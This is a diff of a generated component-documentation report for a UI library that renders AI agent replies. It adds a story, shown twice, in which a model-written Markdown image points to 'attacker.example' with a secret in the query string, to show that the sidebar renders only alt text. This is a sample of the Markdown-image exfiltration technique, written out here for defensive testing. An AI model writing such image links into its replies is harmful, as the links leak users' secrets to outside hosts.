@@ -576,13 +576,13 @@
 <header>
   <div class="wrap">
     <h1>Manifest Debugger</h1>
-    <div class="summary"><a class="filter-pill all" data-k="all" href="#filter-all">All</a><a class="filter-pill err" data-k="errors" href="#filter-errors">5/83 prop type errors</a><a class="filter-pill info" data-k="infos" href="#filter-infos">80/83 infos</a><span class="filter-pill ok" aria-disabled="true">364 stories ok</span></div>
+    <div class="summary"><a class="filter-pill all" data-k="all" href="#filter-all">All</a><a class="filter-pill err" data-k="errors" href="#filter-errors">5/83 prop type errors</a><a class="filter-pill info" data-k="infos" href="#filter-infos">80/83 infos</a><span class="filter-pill ok" aria-disabled="true">365 stories ok</span></div>
   </div>
 </header>
 <main>
   <div class="wrap">
     <div class="note info" style="margin-bottom: 16px;">
-            <strong>Tip:</strong> You are using <code>react-docgen</code> (the default). Generation took <strong>2.9s</strong>. For higher quality prop types, consider switching to <code>react-docgen-typescript</code> in your <code>main.ts</code>:
+            <strong>Tip:</strong> You are using <code>react-docgen</code> (the default). Generation took <strong>1.4s</strong>. For higher quality prop types, consider switching to <code>react-docgen-typescript</code> in your <code>main.ts</code>:
             <pre><code>typescript: {
   reactDocgen: 'react-docgen-typescript',
 }</code></pre>
@@ -7844,7 +7844,7 @@ function greet(name: string): string {
       <div class="badges">
         <label for="c-43-ui-agent-messages-err" class="badge err as-toggle">prop type error</label>
         <label for="c-43-ui-agent-messages-info" class="badge info as-toggle">1 info</label>
-        <label for="c-43-ui-agent-messages-stories" class="badge ok as-toggle">12 stories</label>
+        <label for="c-43-ui-agent-messages-stories" class="badge ok as-toggle">13 stories</label>
         
       </div>
     </div>
@@ -7931,6 +7931,19 @@ See the [audit log docs](https://docs.mirrorstack.ai/audit) for details.`;
 /** Agent replies render Markdown: headings, lists, inline + fenced code, links. */
 export const AgentMarkdown: StoryObj = {
   render: () =&gt; &lt;AgentSidebarAgentMessage content={markdownReply} /&gt;,
+};
+
+/** A model-written image in a reply renders only its alt text — no `&lt;img&gt;` is
+ *  ever created, so a URL like `?q=&lt;secret&gt;` can&#39;t be fetched from the
+ *  sidebar. See AgentSidebarMarkdown.tsx and AgentSidebarMarkdownImage.test.tsx. */
+export const AgentMarkdownWithImage: StoryObj = {
+  render: () =&gt; (
+    &lt;AgentSidebarAgentMessage
+      content={
+        &quot;Here&#39;s the chart you asked about: ![quarterly revenue chart](https://attacker.example/?q=secret)\n\nLet me know if you&#39;d like a different view.&quot;
+      }
+    /&gt;
+  ),
 };
 
 /** Mid-stream markdown with every construct a real reply carries — heading,
@@ -8167,6 +8180,21 @@ export const Responding: StoryObj = {
               
               <div class="hint">Agent replies render Markdown: headings, lists, inline + fenced code, links.</div>
               <pre><code>const AgentMarkdown = () =&gt; &lt;AgentSidebarAgentMessage content={markdownReply} /&gt;;</code></pre>
+            </div>
+            <div class="note ok">
+              <div class="row">
+                <span class="ex-name">Agent Markdown With Image</span>
+                <span class="badge ok">story ok</span>
+              </div>
+              
+              <div class="hint">A model-written image in a reply renders only its alt text — no `&lt;img&gt;` is ever created, so a URL like `?q=&lt;secret&gt;` can&#39;t be fetched from the sidebar. See AgentSidebarMarkdown.tsx and AgentSidebarMarkdownImage.test.tsx.</div>
+              <pre><code>const AgentMarkdownWithImage = () =&gt; (
+  &lt;AgentSidebarAgentMessage
+    content={
+      &quot;Here&#39;s the chart you asked about: ![quarterly revenue chart](https://attacker.example/?q=secret)\n\nLet me know if you&#39;d like a different view.&quot;
+    }
+  /&gt;
+);</code></pre>
             </div>
             <div class="note ok">
               <div class="row">
@@ -16702,7 +16730,7 @@ value: string</code></pre>
       <div class="badges">
         <label for="c-error-0-ui-agent-messages-err" class="badge err as-toggle">prop type error</label>
         <label for="c-error-0-ui-agent-messages-info" class="badge info as-toggle">1 info</label>
-        <label for="c-error-0-ui-agent-messages-stories" class="badge ok as-toggle">12 stories</label>
+        <label for="c-error-0-ui-agent-messages-stories" class="badge ok as-toggle">13 stories</label>
         
       </div>
     </div>
@@ -16789,6 +16817,19 @@ See the [audit log docs](https://docs.mirrorstack.ai/audit) for details.`;
 /** Agent replies render Markdown: headings, lists, inline + fenced code, links. */
 export const AgentMarkdown: StoryObj = {
   render: () =&gt; &lt;AgentSidebarAgentMessage content={markdownReply} /&gt;,
+};
+
+/** A model-written image in a reply renders only its alt text — no `&lt;img&gt;` is
+ *  ever created, so a URL like `?q=&lt;secret&gt;` can&#39;t be fetched from the
+ *  sidebar. See AgentSidebarMarkdown.tsx and AgentSidebarMarkdownImage.test.tsx. */
+export const AgentMarkdownWithImage: StoryObj = {
+  render: () =&gt; (
+    &lt;AgentSidebarAgentMessage
+      content={
+        &quot;Here&#39;s the chart you asked about: ![quarterly revenue chart](https://attacker.example/?q=secret)\n\nLet me know if you&#39;d like a different view.&quot;
+      }
+    /&gt;
+  ),
 };
 
 /** Mid-stream markdown with every construct a real reply carries — heading,
@@ -17025,6 +17066,21 @@ export const Responding: StoryObj = {
               
               <div class="hint">Agent replies render Markdown: headings, lists, inline + fenced code, links.</div>
               <pre><code>const AgentMarkdown = () =&gt; &lt;AgentSidebarAgentMessage content={markdownReply} /&gt;;</code></pre>
+            </div>
+            <div class="note ok">
+              <div class="row">
+                <span class="ex-name">Agent Markdown With Image</span>
+                <span class="badge ok">story ok</span>
+              </div>
+              
+              <div class="hint">A model-written image in a reply renders only its alt text — no `&lt;img&gt;` is ever created, so a URL like `?q=&lt;secret&gt;` can&#39;t be fetched from the sidebar. See AgentSidebarMarkdown.tsx and AgentSidebarMarkdownImage.test.tsx.</div>
+              <pre><code>const AgentMarkdownWithImage = () =&gt; (
+  &lt;AgentSidebarAgentMessage
+    content={
+      &quot;Here&#39;s the chart you asked about: ![quarterly revenue chart](https://attacker.example/?q=secret)\n\nLet me know if you&#39;d like a different view.&quot;
+    }
+  /&gt;
+);</code></pre>
             </div>
             <div class="note ok">
               <div class="row">
